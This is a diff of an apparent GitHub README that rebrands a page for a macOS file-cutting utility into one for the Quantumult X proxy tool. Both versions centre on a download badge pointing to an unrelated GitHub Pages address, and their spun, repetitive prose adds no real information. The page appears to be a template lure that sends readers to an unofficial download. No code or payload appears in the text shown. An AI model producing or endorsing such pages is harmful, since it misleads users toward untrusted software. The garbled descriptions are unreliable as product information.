@@ -1,59 +1,59 @@
-# Command X OSX
+# Quantumult X – Network Proxy Tool
 
 <p align="center">
-  <img src="https://sindresorhus.com/apps/command-x/icon.png" width="200" alt="Command X icon"/>
+  <img src="https://mac.cdncg.com/2024/09/Quantumult-X.png" width="200" alt="Quantumult X icon"/>
 </p>
 
 <p align="center">
-
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://krriv-progms.github.io/.github/commandx)
-
+  <a href="https://krriv-progms.github.io/.github/quantumultx">
+    <img src="https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png" width="200" alt="Download Quantumult X"/>
+  </a>
 </p>
 
 <p align="center">
-  <img src="https://mac-cdn.softpedia.com/screenshots/Command-X_1.jpg" alt="Command X screenshot"/>
+  <img src="https://www.maclx.com/wp-content/uploads/2024/09/iShot_2024-09-25_08.30.52-1024x817.jpg" alt="Quantumult X screenshot"/>
 </p>
 
 ---
 
 ## Overview
 
-File management requires cutting files for move operations where macOS lacks native cut functionality forcing copy-delete workflow demanding utilities adding Windows-like cut feature streamlining file organization. <a href="#">Command X</a> provides file cut utility offering true file cutting, Finder integration, and keyboard shortcuts serving Mac users requiring efficient file moving beyond copy-delete workflow. True file cutting enables cut-paste operations through authentic cut functionality where moving files efficiently proves essential for file organization maintaining streamlined workflow proving valuable for users requiring quick moves supporting file reorganization, cleanup operations, or folder management without copy-delete sequence consuming extra steps creating workflow <a href="#">friction</a> affecting file management efficiency through unnecessarily complex move operations requiring multiple actions.
+<a href="#">Quantumult X</a> delivers advanced network control through rule-based routing and debugging tools serving users requiring granular proxy management beyond simple VPN services. Selective routing through rule-based traffic directs connections via policies customizing routing proves essential for network optimization maintaining routing control proving valuable for requiring selective routing supporting region-specific routing, service optimization, or traffic distribution without global proxying affecting all traffic creating performance overhead or service <a href="#">conflicts</a>.
 
-Finder integration adds cut functionality through system integration where using cut anywhere proves essential for universal access maintaining consistent operation proving valuable for users requiring Finder-wide cut supporting desktop moves, application moves, or folder reorganization without application-specific limitations restricting cut availability creating inconsistent behavior affecting workflow predictability. Keyboard shortcuts enable quick cutting through Command-X shortcut where executing cuts rapidly proves essential for keyboard workflow maintaining efficiency proving valuable for keyboard users requiring shortcut access supporting rapid file operations, keyboard-driven organization, or <a href="#">productivity</a> workflows without mouse interaction consuming time or breaking keyboard flow creating input method switching affecting workflow momentum through mode changes.
+Programmable proxy through script support enables custom logic extending functionality proves essential for advanced scenarios maintaining customization capability proving valuable for developers requiring programmable proxy supporting request modification, response filtering, or automated actions without static configuration limiting functionality creating rigid proxy behavior preventing specialized use cases. Development workflow through network debugging captures HTTP traffic analyzing connections proves essential for development or troubleshooting maintaining visibility proving valuable for requiring network analysis supporting API debugging, app reverse engineering, or connection diagnosis without separate packet capture tools fragmenting workflow or requiring network <a href="#">expertise</a>.
 
-Visual feedback indicates cut status through visual indication where confirming cut operation proves essential for operation awareness maintaining user confidence proving valuable for users requiring confirmation supporting operation verification, status awareness, or mistake prevention without ambiguous state creating uncertainty about cut status requiring verification consuming attention or causing accidental operations from status confusion. Context menu support adds cut option through right-click menu where accessing cut contextually proves essential for mouse workflow maintaining menu accessibility proving valuable for mouse users requiring context menu access supporting quick operations, right-click workflow, or <a href="#">contextual</a> actions without keyboard shortcuts consuming memorization effort or requiring keyboard switching creating workflow interruption.
+Encrypted analysis through HTTP capture intercepts web requests inspecting HTTPS proves essential for detailed analysis maintaining deep inspection proving valuable for requiring encrypted traffic analysis supporting secure API debugging, certificate validation, or encrypted connection inspection without encryption preventing analysis creating blind spots affecting troubleshooting capability. Connection optimization through DNS improvement improves resolution enhancing lookup proves essential for performance maintaining connection speed proving valuable for requiring DNS control supporting custom DNS servers, DNS over HTTPS, or split DNS without system-wide DNS changes affecting all applications creating configuration <a href="#">limitations</a>.
 
-Undo capability reverses cut operations through undo functionality where correcting mistakes proves essential for error recovery maintaining operation safety proving valuable for users requiring mistake correction supporting accidental cut recovery, operation reversal, or exploratory cutting without permanent consequences creating fear of cutting preventing casual file exploration or requiring extreme caution affecting workflow confidence. The application operates unobtrusively without system impact through minimal footprint where maintaining performance proves essential for daily use proving valuable for users requiring utilities without overhead supporting constant operation, system efficiency, or resource conservation without memory consumption or processing usage affecting system performance creating usability concerns for utility software running <a href="#">continuously</a>.
+Configuration management through policy groups organizes routing rules managing configurations proves essential for organization maintaining rule structure proving valuable for managing complex rules requiring policy organization supporting geographic routing, service groups, or fallback policies without flat rule lists creating management confusion affecting rule maintainability. Network performance through efficient operation operates without impact maintaining network speed proves essential for daily use proving valuable for requiring performant proxy supporting streaming, gaming, or downloads without proxy overhead creating connection slowdowns affecting user experience through latency or bandwidth <a href="#">degradation</a>.
 
 ---
 
 ## Key Features
 
-- <a href="#">True</a> file cutting enabling cut-paste operations authentic
-- Finder <a href="#">integration</a> adding cut functionality system-wide universal
-- <a href="#">Keyboard</a> shortcuts enabling quick cutting Command-X support
-- Visual <a href="#">feedback</a> indicating cut status confirmation clear
-- <a href="#">Context</a> menu support adding cut option right-click accessible
-- Undo <a href="#">capability</a> reversing operations mistake correction safe
-- <a href="#">Unobtrusive</a> operation maintaining performance minimal footprint
-- File <a href="#">management</a> streamlining move operations efficient workflow
-- <a href="#">Cut</a> functionality providing Windows-like feature macOS missing
+- <a href="#">Rule-based</a> routing directing traffic policies intelligent selective
+- Script <a href="#">support</a> enabling custom logic JavaScript programmable
+- <a href="#">Network</a> debugging capturing HTTP traffic request inspection
+- HTTP <a href="#">capture</a> intercepting web requests MITM analysis
+- <a href="#">DNS</a> optimization improving resolution configuration custom
+- Policy <a href="#">groups</a> organizing routing rules management structured
+- <a href="#">Efficient</a> operation maintaining performance optimized proxy
+- Advanced <a href="#">proxy</a> providing granular control network management
+- <a href="#">Traffic</a> routing supporting selective connection policies flexible
 
 ---
 
 <p align="center">
-  <img src="https://mac-cdn.softpedia.com/screenshots/Command-X_2.jpg" alt="Command X screenshot"/>
+  <img src="https://pic.macked.app/static/5567b0b0f7526746e673434ddbf9c5c5-1746581876.webp" alt="Quantumult X screenshot"/>
 </p>
 
 ---
 
 ## Additional Information
 
-Command X OSX excels for streamlined file management. True file cutting enables efficient moves without copy-delete sequence consuming extra steps.
+Quantumult X distinguishes itself through advanced features beyond consumer VPNs. Unlike simple proxies, rule-based routing serves granular network management requirements.
 
-Finder integration provides universal access. System-wide cut functionality supports consistent operation without application-specific limitations.
+Developers appreciate HTTP capture for encrypted analysis. MITM proxy enables HTTPS inspection without encryption preventing troubleshooting visibility.
 
-Keyboard shortcuts enable efficient workflow. Command-X support maintains keyboard flow without mouse interaction breaking momentum.
+The application's efficient operation maintains performance. Optimized proxy supports streaming or gaming without overhead creating slowdowns.
 
 ---
